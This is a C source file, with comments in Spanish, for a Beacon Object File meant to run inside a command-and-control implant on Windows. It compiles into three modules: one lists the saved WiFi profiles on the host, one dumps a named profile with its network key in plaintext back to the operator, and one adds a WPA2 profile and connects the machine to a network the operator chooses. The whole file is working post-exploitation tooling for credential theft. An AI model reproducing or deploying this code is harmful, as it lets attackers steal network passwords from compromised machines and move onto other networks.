/*
 * wifidump.c - WiFi enumeration, credential dump y conexión BOF
 *
 * Compilar tres objetos separados desde el mismo fuente:
 *
 *   Enum:
 *     x86_64-w64-mingw32-gcc -Wall -masm=intel -fno-stack-check -fno-stack-protector -mno-stack-arg-probe -DBOF_ENTRY_ENUM -c wifidump.c -o _bin/wifidump_enum.x64.o
 *
 *   Dump (plaintext key):
 *     x86_64-w64-mingw32-gcc -Wall -masm=intel -fno-stack-check -fno-stack-protector -mno-stack-arg-probe -DBOF_ENTRY_DUMP -c wifidump.c -o _bin/wifidump_dump.x64.o
 *
 *   Auth (connect):
 *     x86_64-w64-mingw32-gcc -Wall -masm=intel -fno-stack-check -fno-stack-protector -mno-stack-arg-probe -DBOF_ENTRY_AUTH -c wifidump.c -o _bin/wifidump_auth.x64.o
 *
 * O simplemente: make
 */

#ifndef UNICODE
#define UNICODE
#endif

#include <windows.h>
#include <wlanapi.h>
#include <objbase.h>
#include <wtypes.h>
#include "beacon.h"

#ifndef WLAN_PROFILE_GROUP_POLICY
#define WLAN_PROFILE_GROUP_POLICY 0x00000001
#endif

/* DFR declarations */
DECLSPEC_IMPORT DWORD WINAPI WLANAPI$WlanOpenHandle(DWORD, PVOID, PDWORD, PHANDLE);
DECLSPEC_IMPORT DWORD WINAPI WLANAPI$WlanCloseHandle(HANDLE, PVOID);
DECLSPEC_IMPORT DWORD WINAPI WLANAPI$WlanEnumInterfaces(HANDLE, PVOID, PWLAN_INTERFACE_INFO_LIST *);
DECLSPEC_IMPORT INT   WINAPI OLE32$StringFromGUID2(REFGUID, LPOLESTR, INT);
DECLSPEC_IMPORT DWORD WINAPI WLANAPI$WlanGetProfile(HANDLE, const GUID *, LPCWSTR, PVOID, LPWSTR *, DWORD *, DWORD *);
DECLSPEC_IMPORT VOID  WINAPI WLANAPI$WlanFreeMemory(PVOID);
DECLSPEC_IMPORT DWORD WINAPI WLANAPI$WlanGetProfileList(HANDLE, const GUID *, PVOID, PWLAN_PROFILE_INFO_LIST *);
DECLSPEC_IMPORT DWORD WINAPI WLANAPI$WlanSetProfile(HANDLE, const GUID *, DWORD, LPCWSTR, LPCWSTR, BOOL, PVOID, PDWORD);
DECLSPEC_IMPORT DWORD WINAPI WLANAPI$WlanConnect(HANDLE, const GUID *, const PWLAN_CONNECTION_PARAMETERS, PVOID);

DECLSPEC_IMPORT int    __cdecl MSVCRT$_snwprintf(wchar_t *, size_t, const wchar_t *, ...);
DECLSPEC_IMPORT void * __cdecl MSVCRT$memset(void *, int, size_t);
DECLSPEC_IMPORT void * __cdecl MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void   __cdecl MSVCRT$free(void *);

/* ======================================================================
 * run_wifienum
 * ====================================================================== */
#if defined(BOF_ENTRY_DUMP) || defined(BOF_ENTRY_AUTH)
__attribute__((unused))
#endif
static void run_wifienum(void) {
    HANDLE hClient = NULL;
    DWORD dwMaxClient  = 2, dwCurVersion = 0, dwResult = 0;
    unsigned int i, j;
    PWLAN_INTERFACE_INFO_LIST pIfList     = NULL;
    PWLAN_INTERFACE_INFO      pIfInfo     = NULL;
    PWLAN_PROFILE_INFO_LIST   pProfileList = NULL;
    PWLAN_PROFILE_INFO        pProfile    = NULL;

    dwResult = WLANAPI$WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
    if (dwResult != ERROR_SUCCESS) { BeaconPrintf(CALLBACK_ERROR, "WlanOpenHandle failed: %u\n", dwResult); return; }

    dwResult = WLANAPI$WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (dwResult != ERROR_SUCCESS) { BeaconPrintf(CALLBACK_ERROR, "WlanEnumInterfaces failed: %u\n", dwResult); goto cleanup; }

    for (i = 0; i < pIfList->dwNumberOfItems; i++) {
        pIfInfo = (WLAN_INTERFACE_INFO *)&pIfList->InterfaceInfo[i];
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Interface: %ws\n", pIfInfo->strInterfaceDescription);

        dwResult = WLANAPI$WlanGetProfileList(hClient, &pIfInfo->InterfaceGuid, NULL, &pProfileList);
        if (dwResult != ERROR_SUCCESS) { BeaconPrintf(CALLBACK_ERROR, "  WlanGetProfileList failed: %u\n", dwResult); continue; }
        if (pProfileList->dwNumberOfItems == 0) BeaconPrintf(CALLBACK_OUTPUT, "  (no profiles found)\n");

        for (j = 0; j < pProfileList->dwNumberOfItems; j++) {
            pProfile = (WLAN_PROFILE_INFO *)&pProfileList->ProfileInfo[j];
            BeaconPrintf(CALLBACK_OUTPUT, "  [%u] %ws\n", j, pProfile->strProfileName);
        }
        WLANAPI$WlanFreeMemory(pProfileList); pProfileList = NULL;
    }

cleanup:
    if (pIfList) WLANAPI$WlanFreeMemory(pIfList);
    if (hClient) WLANAPI$WlanCloseHandle(hClient, NULL);
}

/* ======================================================================
 * run_wifidump — Args: wstr ssid
 *
 * NOTA: el .axs empaqueta con bof_pack("wstr", ...) → UTF-16 ya listo.
 *       Cast directo a wchar_t*, NO usar toWideChar (corrompería el string).
 * ====================================================================== */
#if defined(BOF_ENTRY_ENUM) || defined(BOF_ENTRY_AUTH)
__attribute__((unused))
#endif
static void run_wifidump(IN PCHAR Buffer, IN ULONG Length) {
    datap parser;
    BeaconDataParse(&parser, Buffer, Length);

    /* wstr viene UTF-16 desde el .axs → cast directo */
    wchar_t *pProfileName = (wchar_t *)BeaconDataExtract(&parser, NULL);

    if (!pProfileName || pProfileName[0] == L'\0') {
        BeaconPrintf(CALLBACK_ERROR, "No profile name provided.\n");
        return;
    }

    HANDLE hClient = NULL;
    DWORD dwMaxClient  = 2, dwCurVersion = 0, dwResult = 0;
    unsigned int i;
    PWLAN_INTERFACE_INFO_LIST pIfList      = NULL;
    PWLAN_INTERFACE_INFO      pIfInfo      = NULL;
    LPWSTR pProfileXml                     = NULL;
    DWORD  dwFlags                         = WLAN_PROFILE_GET_PLAINTEXT_KEY;
    DWORD  dwGrantedAccess                 = 0;

    dwResult = WLANAPI$WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
    if (dwResult != ERROR_SUCCESS) { BeaconPrintf(CALLBACK_ERROR, "WlanOpenHandle failed: %u\n", dwResult); return; }

    dwResult = WLANAPI$WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (dwResult != ERROR_SUCCESS) { BeaconPrintf(CALLBACK_ERROR, "WlanEnumInterfaces failed: %u\n", dwResult); goto cleanup; }

    for (i = 0; i < pIfList->dwNumberOfItems; i++) {
        pIfInfo = (WLAN_INTERFACE_INFO *)&pIfList->InterfaceInfo[i];
        dwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
        dwResult = WLANAPI$WlanGetProfile(hClient, &pIfInfo->InterfaceGuid, pProfileName,
                                          NULL, &pProfileXml, &dwFlags, &dwGrantedAccess);
        if (dwResult != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "WlanGetProfile failed for '%ws' on '%ws': %u\n",
                pProfileName, pIfInfo->strInterfaceDescription, dwResult);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Profile XML (%ws):\n%ws\n",
                pIfInfo->strInterfaceDescription, pProfileXml);
            WLANAPI$WlanFreeMemory(pProfileXml); pProfileXml = NULL;
        }
    }

cleanup:
    if (pIfList) WLANAPI$WlanFreeMemory(pIfList);
    if (hClient) WLANAPI$WlanCloseHandle(hClient, NULL);
}

/* ======================================================================
 * run_wifiauth — conecta a una red WPA2-PSK
 *
 * Args: wstr ssid, wstr password
 *
 * NOTA: el .axs empaqueta con bof_pack("wstr,wstr", ...) → UTF-16 ya listo.
 *       Cast directo a wchar_t*, NO usar toWideChar (corrompería el string).
 * ====================================================================== */
#if defined(BOF_ENTRY_ENUM) || defined(BOF_ENTRY_DUMP)
__attribute__((unused))
#endif
static void run_wifiauth(IN PCHAR Buffer, IN ULONG Length) {
    datap parser;
    BeaconDataParse(&parser, Buffer, Length);

    /* wstr viene UTF-16 desde el .axs → cast directo */
    wchar_t *pSsid = (wchar_t *)BeaconDataExtract(&parser, NULL);
    wchar_t *pPass = (wchar_t *)BeaconDataExtract(&parser, NULL);

    if (!pSsid || pSsid[0] == L'\0') { BeaconPrintf(CALLBACK_ERROR, "No SSID provided.\n"); return; }
    if (!pPass || pPass[0] == L'\0') { BeaconPrintf(CALLBACK_ERROR, "No password provided.\n"); return; }

    /* Buffer XML en heap para evitar __chkstk_ms */
    WCHAR *xmlProfile = (WCHAR *)MSVCRT$malloc(4096 * sizeof(WCHAR));
    if (!xmlProfile) { BeaconPrintf(CALLBACK_ERROR, "malloc failed.\n"); return; }
    MSVCRT$memset(xmlProfile, 0, 4096 * sizeof(WCHAR));

    MSVCRT$_snwprintf(xmlProfile, 4095,
        L"<?xml version=\"1.0\"?>"
        L"<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">"
          L"<name>%s</name>"
          L"<SSIDConfig><SSID><name>%s</name></SSID></SSIDConfig>"
          L"<connectionType>ESS</connectionType>"
          L"<connectionMode>manual</connectionMode>"
          L"<MSM><security>"
            L"<authEncryption>"
              L"<authentication>WPA2PSK</authentication>"
              L"<encryption>AES</encryption>"
              L"<useOneX>false</useOneX>"
            L"</authEncryption>"
            L"<sharedKey>"
              L"<keyType>passPhrase</keyType>"
              L"<protected>false</protected>"
              L"<keyMaterial>%s</keyMaterial>"
            L"</sharedKey>"
          L"</security></MSM>"
        L"</WLANProfile>",
        pSsid, pSsid, pPass
    );

    HANDLE hClient = NULL;
    DWORD dwMaxClient = 2, dwCurVersion = 0, dwResult = 0;

    dwResult = WLANAPI$WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
    if (dwResult != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "WlanOpenHandle failed: %u\n", dwResult);
        MSVCRT$free(xmlProfile);
        return;
    }

    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    dwResult = WLANAPI$WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (dwResult != ERROR_SUCCESS || pIfList->dwNumberOfItems == 0) {
        BeaconPrintf(CALLBACK_ERROR, "WlanEnumInterfaces failed or no interfaces: %u\n", dwResult);
        goto cleanup;
    }

    /* Primera interfaz disponible */
    PWLAN_INTERFACE_INFO pIfInfo = (WLAN_INTERFACE_INFO *)&pIfList->InterfaceInfo[0];
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Interface : %ws\n", pIfInfo->strInterfaceDescription);

    /* Registrar el perfil (sobreescribe si ya existe) */
    DWORD dwReasonCode = 0;
    dwResult = WLANAPI$WlanSetProfile(hClient, &pIfInfo->InterfaceGuid,
                                      0, xmlProfile, NULL, TRUE, NULL, &dwReasonCode);
    if (dwResult != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "WlanSetProfile failed: %u (reason: %u)\n", dwResult, dwReasonCode);
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Profile registered for '%ws'\n", pSsid);

    /* Conectar */
    WLAN_CONNECTION_PARAMETERS connParams;
    MSVCRT$memset(&connParams, 0, sizeof(connParams));
    connParams.wlanConnectionMode = wlan_connection_mode_profile;
    connParams.strProfile         = pSsid;
    connParams.pDot11Ssid         = NULL;
    connParams.pDesiredBssidList  = NULL;
    connParams.dot11BssType       = dot11_BSS_type_infrastructure;
    connParams.dwFlags            = 0;

    dwResult = WLANAPI$WlanConnect(hClient, &pIfInfo->InterfaceGuid, &connParams, NULL);
    if (dwResult != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "WlanConnect failed: %u\n", dwResult);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Connection request sent for '%ws'\n", pSsid);
    }

cleanup:
    MSVCRT$free(xmlProfile);
    if (pIfList) WLANAPI$WlanFreeMemory(pIfList);
    if (hClient) WLANAPI$WlanCloseHandle(hClient, NULL);
}

/* ======================================================================
 * Entrypoints
 * ====================================================================== */
#if defined(BOF_ENTRY_ENUM)
void go(IN PCHAR Buffer, IN ULONG Length) { run_wifienum(); }

#elif defined(BOF_ENTRY_DUMP)
void go(IN PCHAR Buffer, IN ULONG Length) { run_wifidump(Buffer, Length); }

#elif defined(BOF_ENTRY_AUTH)
void go(IN PCHAR Buffer, IN ULONG Length) { run_wifiauth(Buffer, Length); }

#else
#error "Define -DBOF_ENTRY_ENUM, -DBOF_ENTRY_DUMP o -DBOF_ENTRY_AUTH al compilar."
#endif
